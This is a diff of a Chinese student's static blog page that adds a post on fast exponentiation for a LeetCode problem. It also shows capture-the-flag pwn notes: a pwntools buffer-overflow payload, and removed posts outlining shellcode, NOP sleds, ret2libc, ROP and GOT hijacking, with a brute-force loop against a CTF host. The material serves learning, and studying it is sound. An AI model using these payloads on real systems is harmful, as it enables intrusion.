(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;a1);</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span> (a1)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld&quot;</span>, &amp;b, &amp;c, &amp;d);</span><br><span class="line">                <span class="built_in">update</span>(b, c, <span class="number">1</span>, n, <span class="number">1</span>, d);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld&quot;</span>, &amp;e, &amp;f);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">query</span>(e, f, <span class="number">1</span>, n, <span class="number">1</span>));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(stdin);</span><br><span class="line">    <span class="built_in">fclose</span>(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/05/30/LC-Pow(n,x)/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="一个废物捏">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/05/30/LC-Pow(n,x)/" class="post-title-link" itemprop="url">LC-Pow(n,x)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-05-30 12:48:30" itemprop="dateCreated datePublished" datetime="2021-05-30T12:48:30+08:00">2021-05-30</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-04-08 20:24:24" itemprop="dateModified" datetime="2022-04-08T20:24:24+08:00">2022-04-08</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="让计算机很快地求出-ab">让计算机很快地求出 $ a^b $</h2>
+<p>暴力相乘的话，电脑要计算 b 次。 用快速幂，计算次数在 <span class="math inline">\(log_2b\)</span> 级别，很实用。</p>
+<h2 id="原理">原理</h2>
+<p>假设我们需要计算<span class="math inline">\(3^{11}\)</span>，因为<span class="math inline">\((11)_{10}=(1011)_{2}\)</span>，即<span class="math inline">\(11=1 \cdot 2^0 + 1 \cdot 2^1 + 0 \cdot 2^2 + 1 \cdot 2^3=1+2+0+8\)</span>，故<span class="math inline">\(3^{11}=3^{1+2+0+8}=3^1\cdot3^2\cdot 3^0\cdot3^8=3^{1\cdot2^0}\cdot3^{1\cdot2^1}\cdot 3^{0\cdot2^2}\cdot3^{1\cdot2^3}\)</span>。</p>
+<p>原本需要3累乘11次如今只需要操作4次</p>
+<p>那么问题的关键就是：b如何展开提取</p>
+<p>b&amp;1 &amp;在这里做运算符，叫做按位与 c=a&amp;b 则c等于a与b分别的二进制的每一位进行“与运算”的结果 b =1011 1 =0001 b&amp;1 =0001</p>
+<p>1.只有b的二进制的最后一位是1时，b&amp;1才会是1 2.同时十进制b/2相当于二进制b砍掉最低位，又或者直接b&gt;&gt;1也有一样的效果 相结合，妙啊，阿sir</p>
+<h1 id="section">100%，72%</h1>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">quickPow</span><span class="params">(<span class="keyword">double</span>&amp; x, <span class="keyword">int</span>&amp; n)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="number">1</span>,base = x;<span class="comment">//ans是要返回的答案； base是用于累乘的每一项</span></span><br><span class="line">        <span class="keyword">while</span> (n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (n &amp; <span class="number">1</span>)ans *= base;</span><br><span class="line">            base *= base;<span class="comment">//base: x^1 --&gt; x^2 --&gt; x^4 --&gt; x^8</span></span><br><span class="line">            n /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;<span class="comment">//总结：base累乘增长很快，而我只需判断每一个base要不要乘上去，根据前面乱七八糟的推理，能成。</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">myPow</span><span class="params">(<span class="keyword">double</span> x, <span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">double</span> ans = <span class="built_in">quickPow</span>(x, n);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1.0</span> / ans;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">double</span> ans = <span class="built_in">quickPow</span>(x, n);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -925,190 +1191,6 @@ transform.forward 代表某物体的x，y，z轴的指向 这3个都是标准向
 <p>第一想法是用这里直接TM的偏移到目标函数，试一试：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;555&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">payload=<span class="number">0x68</span>*<span class="string">&quot;a&quot;</span>+p32(-<span class="number">238</span>)+p32(<span class="number">0x80486CC</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interative()</span><br><span class="line"><span class="comment"># 骗分过样例，暴力出奇迹</span></span><br></pre></td></tr></table></figure>
 <p>但是攻防世界网站又炸了，我是它爹</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/08/%E6%88%91%E5%92%8C%E6%88%91%E7%9A%84Lv-1%E7%9B%96%E4%BA%9A%E5%A5%A5%E7%89%B9%E6%9B%BC%E5%8F%AC%E5%94%A4%E5%99%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="一个废物捏">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/04/08/%E6%88%91%E5%92%8C%E6%88%91%E7%9A%84Lv-1%E7%9B%96%E4%BA%9A%E5%A5%A5%E7%89%B9%E6%9B%BC%E5%8F%AC%E5%94%A4%E5%99%A8/" class="post-title-link" itemprop="url">我和我的Lv.1盖亚奥特曼召唤器</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-04-08 22:09:04" itemprop="dateCreated datePublished" datetime="2021-04-08T22:09:04+08:00">2021-04-08</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-05 10:18:16" itemprop="dateModified" datetime="2021-09-05T10:18:16+08:00">2021-09-05</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="泄露数据">泄露数据</h1>
-<h3 id="printf函数格式化字符串漏洞">printf函数格式化字符串漏洞</h3>
-<h1 id="修改数据">修改数据</h1>
-<h3 id="数据偏移">数据偏移</h3>
-<p>给定读入数据范围过大，以至于可覆盖掉其它数据 strcpy函数的粘贴过程也可以理解为读入</p>
-<h3 id="printf函数格式化字符串漏洞-1">printf函数格式化字符串漏洞</h3>
-<p>向栈内某处出写入数据</p>
-<h3 id="整型变量溢出">整型变量溢出</h3>
-<h1 id="伪随机">伪随机</h1>
-<p>伪随机函数，只要给出同一个种子，在同一个环境下（windows或Linux），会产生相同的结果</p>
-<h1 id="栈溢出">栈溢出</h1>
-<h3 id="shellcode">shellcode</h3>
-<p>修改返回地址，让其指向溢出数据中的一段指令（shellcode）</p>
-<p>shellcode 可以用汇编语言来写再转成对应的机器码，也可以上网搜索直接复制粘贴，这里简单介绍，具体在pwn工具的博客里 （以下为获取pwntools内置集成） （1）先设置目标机的参数 context(os=’linux’, arch=’amd64’, log_level=’debug’) os设置系统为linux系统，arch设置架构为amd64，32位下是i386 log_level用于debug （2）获取shellcode 获得执行system(“/bin/sh”)汇编代码所对应的机器码 asm(shellcraft.sh()) 例子</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>
-<p>获取shellcode的起始地址：</p>
-<p>覆盖完ebp后，填充若干长度的 “”，在写入shellcode。""这个机器码对应的指令是 NOP (No Operation)，也就是告诉 CPU 什么也不做，然后跳到下一条指令。有了这一段 NOP 的填充，只要返回地址能够命中这一段中的任意位置，都可以无副作用地跳转到 shellcode 的起始处，所以这种方法被称为 NOP Sled（中文含义是“滑雪橇”）。</p>
-<p>ps：当函数调用的栈中的数据没有可执行权限，此攻击手法彻底无效</p>
-<h3 id="return2libc">return2libc</h3>
-<p>修改返回地址，让其指向内存中已有的某个函数（return2libc）</p>
-<p>动态库包含了一些系统级的函数（例如 system() 等），鉴于要执行的函数可能需要参数，比如调用 system() 函数打开 shell 的完整形式为 system(“/bin/sh”) ，所以溢出数据也要包括必要的参数。</p>
-<p>下面介绍执行 system(“/bin/sh”)</p>
-<p>payload: padding1 + address of system() + padding2 + address of “/bin/sh”</p>
-<p>“/bin/sh” 的地址在哪里？</p>
-<p>可以在动态库里搜索这个字符串，如果在动态库里找不到，可以将这个字符串加到环境变量里，再通过 getenv() 等函数来确定地址。</p>
-<h3 id="rop">ROP</h3>
-<p>修改返回地址，让其指向内存中已有的一段指令（ROP）</p>
-<h3 id="hijack-got">hijack GOT</h3>
-<p>修改某个被调用函数的地址，让其指向另一个函数（hijack GOT）</p>
-<h1 id="爆破">爆破</h1>
-<p>一旦程序开启了ASLR，除了低3位的地址以外其余全是扯淡，低位地址靠查，高位地址试出来</p>
-<p>一个例子</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">	io = remote(<span class="string">&quot;node2.hackingfor.fun&quot;</span>,<span class="number">36058</span>)</span><br><span class="line">	io.send(<span class="string">&quot;a&quot;</span>*<span class="number">16</span>+p16(<span class="number">0x64e1</span>))</span><br><span class="line">	res = io.recvall()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&quot;&#123;&quot;</span> <span class="keyword">in</span> res: <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="一个废物捏">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="划水骗分二十年，没人比我更懂蒻">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/" class="post-title-link" itemprop="url">函数调用-栈帧</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2021-04-04 20:28:56" itemprop="dateCreated datePublished" datetime="2021-04-04T20:28:56+08:00">2021-04-04</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-09-05 10:18:03" itemprop="dateModified" datetime="2021-09-05T10:18:03+08:00">2021-09-05</time>
-      </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><strong>代码</strong>生成<strong>可执行文件</strong> <strong>可执行文件</strong>运行加载到<strong>内存</strong> 其中<strong>机器指令</strong>位于<strong>代码段</strong></p>
-<img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.jpg" class>
-<p>栈有高地址向低地址生成</p>
-<p>函数调用时，用栈来存放局部变量、参数、返回地址等。</p>
-<p>ebp指向栈底部（在高地址）（该寄存器存放的是栈地址）（可以用来索引确定函数参数或局部变量的位置） esp指向栈顶（在低地址）（该寄存器存放的是栈地址） eip指向下一条需要指向的指令（在代码段）（该寄存器存放的是代码段的地址）</p>
-<p>call指令之前： 首先将被调用函数的参数按照逆序依次压入栈内。如果被调用函数不需要参数，则没有这一步骤。</p>
-<p>call指令只做两件事： 1.打入返回地址 （push eip） 2.跳转（eip=%%%%）</p>
-<p>函数开头： 1.分配栈帧大小（esp=esp-n）（之后用栈就往[esp+m]里写东西） 2.保存母函数的栈基地址于栈中（[esp+m1]=ebp）（母函数也有其栈帧） 3.确定子函数的栈基地址，即当前栈最新空着的地方（ebp=esp+m2） 函数中间： 执行该子函数在代码段的其它指令，其中栈会刚好用到esp+n处 函数结尾： 1.恢复ebp存储母函数的栈基地址（ebp=[esp+m1]） 2.释放该子栈帧的空间（esp=esp+n）</p>
-<p>ret指令只做两件事： 1.弹出返回地址 （eip=pop） 2.跳转</p>
-<p>这是函数嵌套调用时栈的模样： <img src="/2021/04/04/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8-%E6%A0%88%E5%B8%A7/1.png" class></p>
-<p>PS：CGfsb遗留的问题至此解决</p>
 
       
     </div>
